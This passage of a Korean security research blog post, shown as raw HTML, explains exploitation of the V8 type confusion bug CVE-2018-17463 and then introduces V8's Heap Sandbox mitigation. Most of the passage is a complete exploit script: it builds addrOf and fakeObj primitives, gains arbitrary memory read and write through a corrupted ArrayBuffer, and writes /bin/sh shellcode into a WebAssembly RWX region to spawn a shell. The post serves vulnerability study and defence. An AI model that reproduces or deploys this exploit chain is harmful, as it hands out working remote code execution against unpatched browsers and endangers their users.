class="hljs-title">findOverlappingProperties</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">let</span> pNames = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            <span class="hljs-subst">${pNames.map((p) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${p}</span> = obj.<span class="hljs-subst">${p}</span>;`</span>).join(<span class="hljs-string">&apos;\n&apos;</span>)}</span></span><span class="hljs-string">            return [<span class="hljs-subst">${pNames.join(<span class="hljs-string">&apos;, &apos;</span>)}</span>];</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pValues[i] = -i;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}<span class="hljs-comment">// Return address of an object as a BigInt</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            return obj.p<span class="hljs-subst">${p1}</span>.x1;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p2] = { <span class="hljs-attr">y</span>: obj };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>;}<span class="hljs-comment">// Function to write data to obj address</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">            obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">            return orig;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>;}<span class="hljs-comment">// Find Overlapping Properties</span>print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>);<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1);<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>];<span class="hljs-comment">// Memory Read and Write Primitives</span><span class="hljs-keyword">let</span> memory = {    write(addr, bytes) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);        view2.set(bytes);    },    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    },    addrOf(obj) {        arrBuf2.leakMe = obj;        <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;    }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);<span class="hljs-comment">// Generate RWX region via WASM</span>print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;<span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Linux x64 Shellcode to execute /bin/sh</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>,                   <span class="hljs-comment">// push 59 (syscall number for execve)</span>    <span class="hljs-number">0x58</span>,                         <span class="hljs-comment">// pop rax</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>,            <span class="hljs-comment">// xor rdx, rdx (envp = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>,            <span class="hljs-comment">// xor rsi, rsi (argv = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// movabs rdi, &quot;/bin/sh\x00&quot;</span>    <span class="hljs-number">0x57</span>,                         <span class="hljs-comment">// push rdi</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>,            <span class="hljs-comment">// mov rdi, rsp</span>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>                    <span class="hljs-comment">// syscall</span>]);print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode</span>memory.write(wasmRWXAddr, shellcode);print(<span class="hljs-string">&quot;[+] Spawning Shell...&quot;</span>);<span class="hljs-comment">// Execute Shellcode</span>func();</code></pre><h3 id="&#xACB0;&#xACFC;"><a href="#&#xACB0;&#xACFC;" class="headerlink" title="&#xACB0;&#xACFC;"></a>&#xACB0;&#xACFC;</h3><p>&#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC704;&#xCE58;&#xD55C; Wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; exploit&#xC774;&#xBBC0;&#xB85C; &#xC708;&#xB3C4;&#xC6B0; &#xCF54;&#xB4DC;&#xB97C; &#xB9AC;&#xB205;&#xC2A4;&#xB85C; &#xD3EC;&#xD305;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xC258;&#xCF54;&#xB4DC;&#xB9CC; &#xBCC0;&#xACBD;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xB744;&#xC6B0;&#xB294; &#xC258;&#xCF54;&#xB4DC;&#xB97C; shell &#xC744; &#xB744;&#xC6B0;&#xB294; &#xC258;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xACBD;&#xD574;&#xC11C; Linux &#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Windows</li></ul><p><img src="image%203.png" alt="image.png"></p><ul><li>Linux</li></ul><p><img src="image%204.png" alt="image.png"></p><h2 id="1-4-&#xC815;&#xB9AC;"><a href="#1-4-&#xC815;&#xB9AC;" class="headerlink" title="1.4 &#xC815;&#xB9AC;"></a>1.4 &#xC815;&#xB9AC;</h2><p>Part 4.&#xB97C; &#xB2EC;&#xB824;&#xC624;&#xACE0; &#xC788;&#xB294;&#xB370; &#xAE34; &#xD638;&#xD761;&#xC774;&#xC5C8;&#xC73C;&#xB2C8; &#xD55C;&#xBC88; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!(&#xB4A4;&#xC5D0; &#xB0B4;&#xC6A9;&#xC774; &#xB354; &#xC788;&#xAC70;&#xB4E0;&#xC694; &#x314E;.&#x314E;)</p><p>Part 1&#xC5D0;&#xC11C;&#xB294; Chrome &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xC640; V8&#xC744; &#xC774;&#xD574;&#xD558;&#xB294; &#xB370; &#xD544;&#xC694;&#xD55C; &#xAE30;&#xCD08; &#xAC1C;&#xB150;&#xC744; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 2&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC758; &#xAC1C;&#xB150;&#xC744; &#xC124;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC744; &#xB54C; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4;&#xC774; &#xB0B4;&#xBD80; &#xD0C0;&#xC785;&#xC744; &#xC798;&#xBABB; &#xD574;&#xC11D;&#xD558;&#xB294; &#xC774;&#xC720;&#xC640; &#xADF8;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC704;&#xD5D8;&#xC744; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 3 ~ Part 4(&#xC911;&#xAC04;;&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;)&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC5B4;&#xB5BB;&#xAC8C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; &#xAD6C;&#xCD95;&#xB418;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB4E4;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xC5B4;&#xC838; &#xC2E4;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xAE34; &#xD638;&#xD761;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB7;&#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xB744;&#xC6CC; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC5EC;&#xB7EC; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xB97C; &#xB178;&#xB9B4; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xADF8; &#xBCA1;&#xD130;&#xB4E4;&#xC744; &#xC870;&#xD569;&#xD558;&#xBA74; heap &#xC0C1;&#xC758; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xC911; &#xD558;&#xB098;&#xC778; Type Confusion&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xBA70; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xACE0;, &#xAD81;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE)&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xD750;&#xB984;&#xC744; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4;, &#xAE30;&#xC220;&#xC801; &#xAD00;&#xC810;&#xC5D0;&#xC11C; CVE-2018-17463&#xC5D0; &#xB300;&#xD55C; exploit&#xC740; &#xB450; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCDE8;&#xC57D;&#xC810; &#x2192; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#xAD6C;&#xCD95; &#xB2E8;&#xACC4;: Type Confusion&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC548;&#xC815;&#xC801;&#xC778; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(&#xBA54;&#xBAA8;&#xB9AC;) &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB0B4;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC6D0;&#xB9AC;&#xC640; &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80; &#xB3D9;&#xC791; &#xC774;&#xD574;&#xAC00; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#x2192; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(weaponizing&#xB7;pwn) &#xB2E8;&#xACC4;: &#xD655;&#xBCF4;&#xD55C; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;(RWX)&#xB97C; &#xD45C;&#xC801;&#xC73C;&#xB85C; &#xC0BC;&#xC544; &#xC2E4;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB2E8;&#xACC4;&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC778; pwnable/exploit &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC758; &#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC989;, <strong>CVE-2018-17463</strong> &#xC0AC;&#xB840;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBCF4;&#xBA74;, Type Confusion&#xC744; &#xD1B5;&#xD574; Memory Read/Write primitive&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC77C;&#xAE4C;&#xC9C0;&#xAC00; &#x2018;&#xCDE8;&#xC57D;&#xC810;&#xB7;&#xC5D4;&#xC9C4; &#xB808;&#xBCA8;&#xC758; &#xC5F0;&#xAD6C;&#x2019;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xACE0;, &#xADF8; &#xC774;&#xD6C4; wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB7;&#xC810;&#xD504;&#xD14C;&#xC774;&#xBE14;&#xC744; &#xB36E;&#xC5B4;&#xC368; &#xC2E4;&#xC81C; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xBCF4;&#xB2E4; pwnable&#xD55C; &#xC791;&#xC5C5;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC790; pwnable&#xC744; &#xACF5;&#xBD80;&#xD558;&#xC168;&#xB358; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xC81C; &#xAC10;&#xC774; &#xC2AC;&#xC2AC; &#xC624;&#xC2E4; &#xC218;&#xB3C4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB7F0; exploit&#xC774; &#xB098;&#xC624;&#xBA74; &#xC5ED;&#xC0AC;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xC5C7;&#xC774; &#xB098;&#xC654;&#xC8E0;?! &#xBC14;&#xB85C; mitigation &#xC785;&#xB2C8;&#xB2E4; :( </p><p><del>(&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xB294; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xC6C3;&#xC5B4;&#xC57C; &#xD560; &#xC9C0; &#xC6B8;&#xC5B4;&#xC57C; &#xD560; &#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694; &#x1F602;)</del></p><p>V8&#xC740; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC758;&#xB3C4;&#xC640; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Type Confusion&#xACFC; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xACBD;&#xC6B0;&#xAC00; &#xB108;&#xBB34; &#xB9CE;&#xC544;&#xC11C; 2020&#xB144; &#xCD08;&#xC5D0; V8&#xC5D0; Heap Sandbox&#xB77C;&#xB294; mitigation&#xC744; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Heap Sandbox&#xAC00; &#xBB34;&#xC5C7;&#xC774;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC644;&#xD654;&#xB41C;&#xAC74;&#xC9C0; &#xACC4;&#xC18D; &#xC0B4;&#xD3B4;&#xBCF4;&#xB7EC;&#xAC00;&#xC2DC;&#xC8E0;! &#x314E;.&#x314E;</p><h1 id="2-V8-Heap-Sandbox"><a href="#2-V8-Heap-Sandbox" class="headerlink" title="2. V8 Heap Sandbox"></a>2. V8 Heap Sandbox</h1><p>2&#xC7A5;&#xC5D0;&#xC11C; &#xB9D0;&#xD558;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB294; &#xD06C;&#xB86C; &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC544;&#xB2CC; &#xB80C;&#xB354;&#xB9C1; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;, &#xC989; V8 &#xC5D0;&#xC11C;&#xC758; &#xD799; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="2-1-Motivation"><a href="#2-1-Motivation" class="headerlink" title="2.1 Motivation"></a>2.1 Motivation</h2><p><img src="image%205.png" alt="image.png"></p><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xB098;&#xC624;&#xAE30; &#xBA87; &#xB144; &#xAC04; Chrome &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; 60% &#xC774;&#xC0C1;&#xC774; V8&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;, &#xB300;&#xBD80;&#xBD84;&#xC740; &#xACE0;&#xC804;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xBC84;&#xADF8;(UAF, OOB)&#xAC00; &#xC544;&#xB2C8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB098; &#xB7F0;&#xD0C0;&#xC784; &#xCF54;&#xB4DC; &#xB0B4;&#xC758; &#xBBF8;&#xBB18;&#xD55C; &#xB17C;&#xB9AC;&#xC801; &#xBC84;&#xADF8;&#xB098;, &#xC774; &#xB17C;&#xB9AC;&#xC801; &#xBC84;&#xADF8;&#xB97C; &#xC774;&#xC6A9;&#xD55C; memory corruption&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBC84;&#xADF8;&#xB294; &#xAC1C;&#xBC1C;(&#xCF54;&#xB529;)&#xC744; &#xC798;&#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC790;&#xCCB4;&#xAC00; &#xACF5;&#xACA9; &#xD45C;&#xBA74;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; V8&#xC740; &#xD799; &#xB0B4;&#xBD80;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC190;&#xC0C1;&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC804;&#xCCB4;&#xB85C; &#xD37C;&#xC9C0;&#xB294; 